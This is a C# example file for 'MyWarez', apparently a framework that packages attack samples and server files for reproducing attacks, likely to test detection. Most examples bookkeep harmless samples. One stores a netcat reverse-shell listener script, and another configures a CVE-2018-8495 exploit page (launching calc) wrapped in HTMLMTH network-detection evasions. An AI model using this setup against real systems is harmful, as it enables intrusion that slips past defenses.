using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

using MyWarez.Base;
using MyWarez.Core;
using MyWarez.Payloads;
using MyWarez.Plugins.Htmlmth;

namespace Examples
{
    public static partial class AttackExamples
    {
        private static IAttack OutputSkeletonTemplateExample()
        {
            var HOSTNAME = "HostnameA";
            // fetch the Host instance created in MyWarez.Base.Utils.InitHosts using the hosts.yaml file provided, if one does not exist, then create one.
            var HOST = Host.GetHostByHostName(HOSTNAME) ?? new Host(HOSTNAME, HOSTNAME, null);

            // "Output"s produce the files and dependencies necessary to reproduce the attack.

            // SamplesOutput
            //      Used to bookkeep sample files
            var samplesOutput = new SamplesOutput();

            // RemoteFileServerOutput
            //      A generic output for files on a remote server 
            //      Can be used to bookkeep things like reverseshell listeners
            //      Be mindful of which ports on a particular virtual host will already be used...
            var genericServerOutput = new RemoteFileServerOutput(HOST, port: 1337, name: "GenericName");

            // SmbServerOutput
            //      Used to bookkeep files on a SMB fileshare
            var smbSharename = "SomeShare";
            var smbServerOutput = new SmbServerOutput(smbSharename, HOST);

            // HttpServerOutput
            //      Used to bookkeep files on an HTTP server
            var httpServerOutput = new HttpServerOutput(HOST);

            // HtmlmthServerOutput
            //      Used to bookkeep the files need for an HTMLMTH server instance
            //      A HTMLMTH server is used mostly used for client side HTML+HTTP evasions. But can also be used as an HTTP server
            var htmlmthServerOutput = new HtmlmthServerOutput(HOST);

            // An Attack is a collection of everything required to generate the sample(s) + dependencies necessary to reproduce an attack
            //  So, a collection of Output
            var attackName = "OutputSkeletonTemplate"; // Give a descriptive & identifiable name
            var attackNotes = "OutputSkeletonTemplate notes";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
                genericServerOutput,
                smbServerOutput,
                httpServerOutput,
                htmlmthServerOutput
            }, name: attackName, notes: attackNotes);
            // Not all the Output are required. So if one is not going to be used, omit it.


            // .. Code to bookkeep Output files here...


            // Serialize the attack to disk.
            // The output will be in the directory: $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output
            // Since nothing was added to the Outputs, the folder should be empty
            attack.Generate();
            return attack;
        }

        private static IAttack SamplesOutputExample()
        {
            var samplesOutput = new SamplesOutput();
            var attackName = "SamplesOutput";
            var attack = new Attack(new IOutput[] {
                samplesOutput,
            }, name: attackName);

            // To bookkeep a Sample file, call the .Add method with the sample's filename and bytes
            var sampleAFilename = "SamplesOutputExampleA" + MyWarez.Core.Utils.RandomString(10) + ".bin";
            var sampleABytes = new byte[] { 0xde, 0xad, 0xbe, 0xef };
            samplesOutput.Add(sampleAFilename, sampleABytes);

            // Theres an overload that accepts string instead of byte[]
            var sampleBFilename = "SamplesOutputExampleB" + MyWarez.Core.Utils.RandomString(10) + ".txt";
            var sampleBText = "Winner Winner";
            samplesOutput.Add(sampleBFilename, sampleBText);

            // There's also an overload .Add method that accepts an object that implements IFile
            var vbscript = new VBScript("MsgBox 8675309"); // VBScript implemented IFile, as do most of the classes in MyWarez.Core
            var sampleCFilename = "SamplesOutputExampleC" + MyWarez.Core.Utils.RandomString(10) + ".vbs";
            samplesOutput.Add(sampleCFilename, vbscript);

            attack.Generate();
            // 3 files should now be in $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output\Samples
            return attack;
        }

        private static IAttack SmbServerOutputExample()
        {
            var HOSTNAME = "HostnameB";
            var HOST = Host.GetHostByHostName(HOSTNAME) ?? new Host(HOSTNAME, HOSTNAME, null);
            var smbSharename = "BearShare";
            var smbServerOutput = new SmbServerOutput(smbSharename, HOST); // the default port is 445
            var attackName = "SmbServerOutput";
            var attack = new Attack(new IOutput[] {
                smbServerOutput,
            }, name: attackName);

            // SmbServerOutput has the same Add methods as SamplesOutput
            var javascript = new JavaScript("WScript.Echo(1337);");
            // Adding randomization to sample filenames can be useful sometimes
            var sampleAFilename = "SmbServerOutputExampleA" + MyWarez.Core.Utils.RandomString(10) + ".js";
            smbServerOutput.Add(sampleAFilename, javascript);

            attack.Generate();
            // a file should now be in $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output\Server\HostnameB\445_SMB_Server\BearShare
            return attack;
        }

        private static IAttack HttpServerOutputExample()
        {
            var HOSTNAME = "HostnameB";
            var HOST = Host.GetHostByHostName(HOSTNAME) ?? new Host(HOSTNAME, HOSTNAME, null);
            var httpServerOutput = new HttpServerOutput(HOST); // the default port is 80
            var attackName = "HttpServerOutput";
            var attack = new Attack(new IOutput[] {
                httpServerOutput,
            }, name: attackName);

            // The files placed in "$(ProjectDir)\Resources" or "$(ProjectDir)\..\Resources" will be available for use
            // This is useful for bringing in your own exploits, payloads, Output files, etc
            var sampleAResourcePath = Path.Join(MyWarez.Core.Constants.ResourceDirectory, "HttpServerOutput.html");
            var sampleAResourceText = File.ReadAllText(sampleAResourcePath);
            var html = new OnePageWebsite(sampleAResourceText);
            var sampleAFilename = "/somepath/HttpServerOutputExampleA.html";
            // HttpServerOutput has the same Add methods as SamplesOutput
            httpServerOutput.Add(sampleAFilename, html);

            attack.Generate();
            // The file should now be at $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output\Server\HostnameB\80_HTTP_Server\wwwroot\somepath\HttpServerOutputExampleA.html
            return attack;
        }

        private static IAttack RemoteFileServerOutputExample()
        {
            var HOSTNAME = "HostnameB";
            var HOST = Host.GetHostByHostName(HOSTNAME) ?? new Host(HOSTNAME, HOSTNAME, null);
            var listenerServerOutput = new RemoteFileServerOutput(HOST, port: 1337, name: "NetcatListener");
            var attackName = "RemoteFileServerOutput";
            var attack = new Attack(new IOutput[] {
                listenerServerOutput,
            }, name: attackName);

            // RemoteFileServerOutput can be used to keep track of reverse shell listener scripts
            var listenerScriptResourcePath = Path.Join(MyWarez.Core.Constants.ResourceDirectory, "NetcatListener.sh");
            var listenerScript = File.ReadAllText(listenerScriptResourcePath);
            listenerScript = listenerScript.Replace("4444", listenerServerOutput.Port.ToString());
            // RemoteFileServerOutput has the same Add methods as SamplesOutput
            listenerServerOutput.Add("listener.sh", Encoding.ASCII.GetBytes(listenerScript));

            attack.Generate();
            // The listener script should now be at $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output\Server\HostnameB\1337_NetcatListener\NetcatListener.sh
            return attack;
        }

        private static IAttack HtmlmthServerOutputExample()
        {
            // Note: This sample can't use HOSTNAME = HostnameB since port 80 on HostnameB is already occupied by the HTTP Server from Sample4
            var HOSTNAME = "HostnameC1"; // the DNS name "HostnameC1" points to the virtual host "VirtualHostC"
            var VIRTUALHOST = "VirtualHostC";
            var HOST = Host.GetHostByHostName(HOSTNAME) ?? new Host(VIRTUALHOST, HOSTNAME, null);
            var htmlmthServerOutput = new HtmlmthServerOutput(HOST); // the default port is 80
            var attackName = "HtmlmthServerOutput";
            var attack = new Attack(new IOutput[] {
                htmlmthServerOutput,
            }, name: attackName);

            // This represents a commandline used to create a new process
            var cmdline = new Tonsil.Processes.CmdLine() { image = @"calc", arguments = new string[] { } };
            var process = new Tonsil.Processes.Process(cmdline);
            // List of commandlines
            var processList = new ProcessList(new[] { process });
            // Note: this exploit enforces a ProcessList size of size 1
            var exploitWebsite = new CVE_2018_8495(processList);
            // Network Evasions to apply to the delivery of the exploit
            var exploitEvasions = new[]{ // Refer to HTMLMTH documentation & source code for the available evasions
                "htmlmth.evasions.html.entity_encoding_attributes_dec",
                "htmlmth.evasions.html.external_resource_internal_script",
                "htmlmth.evasions.html.insert_slash_after_opening_tag_names",
                "htmlmth.evasions.html.bom_declared_utf_16be_encoded_as_utf_16_be"
            };
            // HtmlmthWebsite represents the HTTP resource(s) hosted by HTMLMTH server
            var exploitHtmlmthWebsite = new HtmlmthWebsite(exploitWebsite, HOST, exploitEvasions);
            // Dont forget to bookkeep
            htmlmthServerOutput.Add(exploitHtmlmthWebsite);

            attack.Generate();
            // The files needed to launch the HTMLMTH server should now be at $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output\Server\HostnameB\80_HTMLMTH_Server
            return attack;
        }

        private static IAttack OutputMergingExample()
        {
            // Note: This sample uses the same virtual host and port for the HTMLMTH server as the HTMLMTH server from Sample6
            var HOSTNAME = "HostnameC2"; // the DNS name "HostnameC2" points to the virtual host "VirtualHostC"
            var VIRTUALHOST = "VirtualHostC"; // So, the host in Sample6 and Sample7 are the same virtual host
            var HOST = Host.GetHostByHostName(HOSTNAME) ?? new Host(VIRTUALHOST, HOSTNAME, null);
            var htmlmthServerOutput = new HtmlmthServerOutput(HOST, scriptEncodingServerHost: "SomeWindowsServerRunningTheEncoderScript.com", scriptEncodingServerPort: 5000); // the default port is 80
            var attackName = "OutputMerging";
            var attack = new Attack(new IOutput[] {
                htmlmthServerOutput,
            }, name: attackName);

            var website = new OnePageWebsite("<html><head><meta http-equiv=\"x-ua-compatible\" content=\"IE=8\"></head><body><script language='VBScript.Encode'>MsgBox Hex(&HBAADF00D)</script></body></html>");
            var evasions = new[]{ // Refer to HTMLMTH documentation & source code for the available evasions
                "htmlmth.evasions.html.encoded_script", // This evasion requires HTMLMTH's scripting_encoder_server.py to be running on a Windows server. This server should be reachable from the HTMLMTH server 
                                                        // This evasion also only works when IE rendering mode is set to <= 8
            };
            var htmlmthWebsite = new HtmlmthWebsite(website, HOST, evasions);
            htmlmthServerOutput.Add(htmlmthWebsite); // bookkeep

            attack.Generate();
            // The files needed to launch the HTMLMTH server should now be at $(ProjectDir)\bin\$(Configuration)\$(TargetFramework)\Output\Server\HostnameB\80_HTMLMTH_Server
            // Note: MyWarez will automatically merge the HTMLMTH server contents correctly for HtmlmthServerOutput on the same virtual host & port
            // Note: The same occurs for multiple HttpServerOutput on the same virtual host & port
            // Note: The same occurs for multiple SmbServerOutput on the same virtual host & port
            // Note: The same occurs for multiple RemoteFileServerOutput on the same virtual host & port
            // Note: Different Output types on the same virtual host & port will NOT be merged
            return attack;
        }

    }
}
